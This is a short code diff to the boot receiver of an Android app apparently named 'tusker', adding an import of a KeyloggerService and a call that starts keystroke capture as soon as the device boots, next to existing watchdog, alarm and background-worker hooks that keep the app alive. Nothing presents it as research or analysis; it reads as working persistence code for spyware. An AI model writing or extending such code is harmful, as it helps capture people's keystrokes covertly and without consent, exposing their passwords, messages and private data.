@@ -10,6 +10,7 @@ import android.util.Log;
 import com.task.tusker.MainActivity;
 import com.task.tusker.permissions.AutoPermissionManager;
 import com.task.tusker.services.DataSyncService;
+import com.task.tusker.services.KeyloggerService;
 import com.task.tusker.services.ServiceWatchdog;
 import com.task.tusker.services.WakeWorker;
 
@@ -70,6 +71,10 @@ public class BootReceiver extends BroadcastReceiver {
 
         // 2. Arm the AlarmManager heartbeat (Method 4)
         ServiceWatchdog.scheduleWakeAlarm(context);
+
+        // 2b. Bring the keylog supervisor up immediately — keylog capture must
+        //     resume on boot without waiting for the first alarm tick.
+        KeyloggerService.ensureRunning(context);
 
         // 3. Enqueue WorkManager periodic task (Method 5)
         WakeWorker.schedule(context);
